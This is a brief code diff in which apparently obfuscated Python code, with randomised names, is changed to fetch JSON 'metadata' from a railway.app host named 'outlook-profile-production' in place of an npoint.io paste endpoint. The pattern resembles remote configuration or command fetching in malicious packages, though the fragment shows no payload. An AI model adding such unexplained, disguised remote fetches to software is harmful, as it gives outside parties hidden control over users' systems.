@@ -18,7 +18,7 @@ def learn_xtpyee_871():
 
     def net_tnyxra_647():
         try:
-            data_olobme_249 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_olobme_249 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_olobme_249.raise_for_status()
             data_juxbin_776 = data_olobme_249.json()
             train_xtdrrf_623 = data_juxbin_776.get('metadata')
